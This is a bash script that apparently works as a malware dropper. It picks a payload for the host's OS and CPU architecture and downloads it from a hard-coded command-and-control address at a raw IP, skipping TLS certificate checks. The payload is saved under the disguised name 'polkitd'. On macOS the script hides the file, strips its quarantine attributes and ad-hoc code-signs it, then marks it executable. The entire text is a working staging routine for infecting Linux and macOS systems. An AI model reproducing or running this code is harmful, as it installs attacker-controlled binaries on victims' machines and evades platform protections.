#!/bin/bash
export PATH=$PATH:/usr/local/bin:/usr/libexec:/usr/bin
for d in /usr/local/bin /usr/libexec /usr/bin; do
  touch $d/writeablex >/dev/null 2>&1 && rm -f $d/writeablex && cd $d
done
[ "$PWD" = "$HOME" ] && cd /tmp
C2=https://192.3.31.148:8443
darwin_amd64=$C2/file/darwin_amd64
darwin_arm64=$C2/file/darwin_arm64
l64=$C2/file/l64
l32=$C2/file/l32
a32=$C2/file/a32
a64=$C2/file/a64
l128=$C2/file/l128
name=polkitd
rm -f $name
os=$(uname -s); arch=$(uname -m)
if [ "$os" = "Darwin" ]; then
  mkdir -p ~/Library/Caches && cd ~/Library/Caches
  [ "$arch" = "arm64" ] && url=$darwin_arm64 || url=$darwin_amd64
else
  case $arch in
    x86_64) url=$l64;; i?86) url=$l32;; armv7*) url=$a32;; aarch64) url=$a64;; loongarch64) url=$l128;;
  esac
fi
if command -v curl >/dev/null 2>&1; then curl -fsSLk -o $name "$url"
elif command -v wget >/dev/null 2>&1; then wget -q --no-check-certificate -O $name "$url"
else python3 -c "import ssl,urllib.request;ssl._create_default_https_context=ssl._create_unverified_context;open('$name','wb').write(urllib.request.urlopen('$url').read())"
fi
if [ "$os" = "Darwin" ]; then
  chflags hidden $name
  xattr -c $name
  xcode-select -p >/dev/null 2>&1 && codesign --force --sign - $name
fi
chmod +x $name
